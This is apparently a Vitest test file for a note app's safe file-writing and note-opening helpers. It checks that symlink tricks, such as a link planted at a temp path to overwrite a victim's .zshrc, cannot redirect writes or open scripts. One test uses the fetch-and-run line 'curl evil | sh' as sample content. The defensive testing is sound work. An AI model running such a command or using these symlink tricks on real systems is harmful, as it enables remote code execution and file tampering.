// SPDX-License-Identifier: GPL-3.0-only
import { lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { openableNote, replaceViaTemp } from './safe-fs'

let dir: string
let vault: string
let outside: string

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'murmur-safefs-'))
  vault = join(dir, 'vault')
  outside = join(dir, 'outside')
  mkdirSync(join(vault, 'murmur'), { recursive: true })
  mkdirSync(outside)
})

afterEach(() => {
  rmSync(dir, { recursive: true, force: true })
})

describe('replaceViaTemp', () => {
  it('replaces the file and leaves no temp behind', () => {
    const todo = join(vault, 'murmur', 'todo.md')
    writeFileSync(todo, '- [ ] call the dentist\n')
    replaceViaTemp(todo, '- [x] call the dentist\n')
    expect(readFileSync(todo, 'utf8')).toBe('- [x] call the dentist\n')
    expect(() => lstatSync(`${todo}.murmur-tmp`)).toThrow()
  })

  it('never writes through a link planted at the temp path', () => {
    const todo = join(vault, 'murmur', 'todo.md')
    const victim = join(outside, '.zshrc')
    writeFileSync(todo, 'curl evil | sh\n')
    writeFileSync(victim, 'export PATH=/usr/bin\n')
    symlinkSync(victim, `${todo}.murmur-tmp`)
    replaceViaTemp(todo, 'curl evil | sh\n')
    expect(readFileSync(victim, 'utf8')).toBe('export PATH=/usr/bin\n')
    expect(lstatSync(todo).isFile()).toBe(true)
  })

  it('replaces a linked file with a plain one instead of writing through it', () => {
    const todo = join(vault, 'murmur', 'todo.md')
    const victim = join(outside, 'target.md')
    writeFileSync(victim, 'untouched\n')
    symlinkSync(victim, todo)
    replaceViaTemp(todo, 'new text\n')
    expect(readFileSync(victim, 'utf8')).toBe('untouched\n')
    expect(lstatSync(todo).isSymbolicLink()).toBe(false)
  })
})

describe('openableNote', () => {
  it('opens a real note file', () => {
    const note = join(vault, 'murmur', 'inbox.md')
    writeFileSync(note, 'hello\n')
    expect(openableNote(note)).toBe(true)
    const text = join(vault, 'notes.TXT')
    writeFileSync(text, 'hello\n')
    expect(openableNote(text)).toBe(true)
  })

  it('opens a link that lands on a note file', () => {
    const real = join(outside, 'real.md')
    writeFileSync(real, 'hello\n')
    const link = join(vault, 'murmur', 'todo.md')
    symlinkSync(real, link)
    expect(openableNote(link)).toBe(true)
  })

  it('refuses a note-named link that lands on a script or an app', () => {
    const script = join(outside, 'run.command')
    writeFileSync(script, '#!/bin/sh\n')
    const link = join(vault, 'murmur', 'todo.md')
    symlinkSync(script, link)
    expect(openableNote(link)).toBe(false)
    const app = join(outside, 'Thing.app')
    mkdirSync(app)
    const appLink = join(vault, 'murmur', 'inbox.md')
    symlinkSync(app, appLink)
    expect(openableNote(appLink)).toBe(false)
  })

  it('refuses a missing file or a folder named like a note', () => {
    expect(openableNote(join(vault, 'missing.md'))).toBe(false)
    const folder = join(vault, 'folder.md')
    mkdirSync(folder)
    expect(openableNote(folder)).toBe(false)
  })
})
